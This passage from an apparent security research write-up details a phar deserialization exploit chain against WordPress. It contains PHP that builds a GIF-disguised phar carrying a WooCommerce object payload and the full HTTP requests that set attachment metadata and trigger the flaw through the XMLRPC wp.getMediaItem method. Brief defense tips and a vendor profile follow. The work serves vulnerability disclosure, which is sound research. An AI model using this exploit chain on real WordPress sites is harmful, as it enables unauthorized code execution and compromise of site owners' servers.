            }
        }
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");
        $phar->startBuffering();
        $phar->setStub("GIF89a".""); //设置stub, 增加gif文件头，伪造文件类型
        $o = new WC_Log_Handler_File();
        $phar->setMetadata($o); //将自定义meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
After changing the suffix to "gif", you can upload it in the background or
through the XMLRPC interface, both of which requires author permissions or
above. Write down the **file name** and **post_ID** after uploading.
Next we have to find a filesystem function whose parameter is controllable:
`wp-includes/post.php`
    function wp_get_attachment_thumb_file( $post_id = 0 ) {
        $post_id = (int) $post_id;
        if ( !$post = get_post( $post_id ) )
            return false;
        if ( !is_array( $imagedata = wp_get_attachment_metadata( $post->ID ) ) )
            return false;
        $file = get_attached_file( $post->ID );
        if ( !empty($imagedata['thumb']) && ($thumbfile = str_replace(basename($file), $imagedata['thumb'], $file)) && file_exists($thumbfile) ) {
            /**
             * Filters the attachment thumbnail file path.
             *
             * @since 2.1.0
             *
             * @param string $thumbfile File path to the attachment thumbnail.
             * @param int    $post_id   Attachment ID.
             */
            return apply_filters( 'wp_get_attachment_thumb_file', $thumbfile, $post->ID );
        }
        return false;
    }
This function can be accessed by calling the "wp.getMediaItem" method via
XMLRPC. The variable `$thumbfile` send `file_exists()`, which is exactly what
we need. Now we need to trace back to the `$thumbfile` variable to see if it's
controllable.
According to `$thumbfile = str_replace(basename($file), $imagedata['thumb'],
$file)`, if `basename($file)` is the same as `$file`, the value of
`$thumbfile` is just that of `$imagedata['thumb']`. Firstly, let's see how
`$file` is obtained:
`wp-includes/post.php`
    function get_attached_file( $attachment_id, $unfiltered = false ) {
        $file = get_post_meta( $attachment_id, '_wp_attached_file', true );
        // If the file is relative, prepend upload dir.
        if ( $file && 0 !== strpos( $file, '/' ) && ! preg_match( '|^.:\\\|', $file ) && ( ( $uploads = wp_get_upload_dir() ) && false === $uploads['error'] ) ) {
            $file = $uploads['basedir'] . "/$file";
        }
        if ( $unfiltered ) {
            return $file;
        }
        /**
         * Filters the attached file based on the given ID.
         *
         * @since 2.1.0
         *
         * @param string $file          Path to attached file.
         * @param int    $attachment_id Attachment ID.
         */
        return apply_filters( 'get_attached_file', $file, $attachment_id );
    }
If `$file` is a path `Z:\Z` similar to the Windows drive letter, the RegExp
will fail, and `$file` will not splice anything else. In this case, you can
ensure that `basename($file)` is the same as `$file`.
You can call the value of setting `$file` by sending the following packet:
    POST /wordpress/wp-admin/post.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 147
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&action=edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
    Connection: close
    _wpnonce=1da6c638f9&_wp_http_referer=%2Fwp-    admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&action=editpost&post_type=attachment&post_ID=11&file=Z:\Z
You can also set the value of `$imagedata['thumb']` by sending the following
packet:
    POST /wordpress/wp-admin/post.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 184
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&action=edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
    Connection: close
    _wpnonce=1da6c638f9&_wp_http_referer=%2Fwp-    admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&action=editattachment&post_ID=11&thumb=phar://./wp-content/uploads/2018/08/phar-1.gif/blah.txt
`_wpnonce` is available on the modification page.
Finally, the `wp_get_attachment_thumb_file()` function is called by calling
"wp.getMediaItem" via XMLRPC to trigger deserialization. The data package
called via XML is as follows:
    POST /wordpress/xmlrpc.php HTTP/1.1
    Host: 127.0.0.1
    Content-Type: text/xml
    Cookie: XDEBUG_SESSION=PHPSTORM
    Content-Length: 529
    Connection: close
      wp.getMediaItem  
            1 
            author 
            you_password
            11 
### 0x04 Defense
  1. When the parameters of filesystem function are controllable, filter the parameters strictly.
  2. Strictly check the contents of the uploaded file, not just the header.
  3. Conditions permitting, disable dangerous functions that can execute system commands and code.
### 0x05 Reference
  1. 
  2. 
  3. 
  4. 
  5. 
### About Knownsec & 404 Team
Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.
Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.
The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").
* * *